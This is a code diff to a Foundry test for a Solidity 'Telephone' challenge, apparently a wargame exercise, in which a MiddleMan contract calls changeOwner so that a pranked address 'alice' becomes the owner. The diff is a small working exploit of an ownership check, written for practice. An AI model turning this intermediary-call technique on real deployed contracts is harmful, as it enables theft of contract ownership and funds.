@@ -6,7 +6,7 @@ import "../src/Telephone.sol";
 
 contract MiddleMan {
     function attack(address telephone) public {
-        Telephone(telephone).changeOwner(address(this));
+        Telephone(telephone).changeOwner(msg.sender);
     }
 }
 
@@ -20,9 +20,11 @@ contract TelephoneTest is Test {
     function test() public {
         assertEq(telephone.owner(), address(this));
 
+        address alice = makeAddr("alice");
+        vm.startPrank(alice);
         MiddleMan middleMan = new MiddleMan();
         middleMan.attack(address(telephone));
 
-        assertEq(telephone.owner(), address(middleMan));
+        assertEq(telephone.owner(), alice);
     }
 }
